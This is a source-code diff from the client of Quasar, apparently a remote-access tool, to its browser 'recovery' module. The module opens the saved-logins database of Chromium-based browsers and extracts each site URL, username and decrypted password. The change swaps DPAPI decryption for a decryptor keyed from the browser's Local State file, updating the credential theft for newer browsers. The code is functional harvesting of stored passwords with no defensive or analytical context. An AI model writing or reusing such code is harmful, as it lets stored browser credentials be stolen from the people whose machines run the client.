@@ -1,10 +1,8 @@
-﻿using System;
+﻿using Quasar.Client.Recovery.Utilities;
 using Quasar.Common.Models;
+using System;
 using System.Collections.Generic;
-using Quasar.Client.Recovery.Utilities;
 using System.IO;
-using System.Security.Cryptography;
-using System.Text;
 
 namespace Quasar.Client.Recovery.Browsers
 {
@@ -23,9 +21,9 @@ namespace Quasar.Client.Recovery.Browsers
         /// Reads the stored accounts of an chromium-based application.
         /// </summary>
         /// <param name="filePath">The file path of the logins database.</param>
-        /// <param name="browserName">The name of the chromium-based application.</param>
+        /// <param name="localStatePath">The file path to the local state.</param>
         /// <returns>A list of recovered accounts.</returns>
-        protected List<RecoveredAccount> ReadAccounts(string filePath, string browserName)
+        protected List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath)
         {
             var result = new List<RecoveredAccount>();
 
@@ -35,6 +33,8 @@ namespace Quasar.Client.Recovery.Browsers
 
                 if (!File.Exists(filePath))
                     return result;
+
+                var decryptor = new ChromiumDecryptor(localStatePath);
 
                 try
                 {
@@ -54,9 +54,7 @@ namespace Quasar.Client.Recovery.Browsers
                     {
                         var host = sqlDatabase.GetValue(i, "origin_url");
                         var user = sqlDatabase.GetValue(i, "username_value");
-                        var pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(
-                            Encoding.Default.GetBytes(sqlDatabase.GetValue(i, "password_value")), null,
-                            DataProtectionScope.CurrentUser));
+                        var pass = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));
 
                         if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                         {
@@ -65,7 +63,7 @@ namespace Quasar.Client.Recovery.Browsers
                                 Url = host,
                                 Username = user,
                                 Password = pass,
-                                Application = browserName
+                                Application = ApplicationName
                             });
                         }
                     }
@@ -77,7 +75,7 @@ namespace Quasar.Client.Recovery.Browsers
             }
             else
             {
-                throw new FileNotFoundException("Can not find chrome logins file");
+                throw new FileNotFoundException("Can not find chromium logins file");
             }
 
             return result;
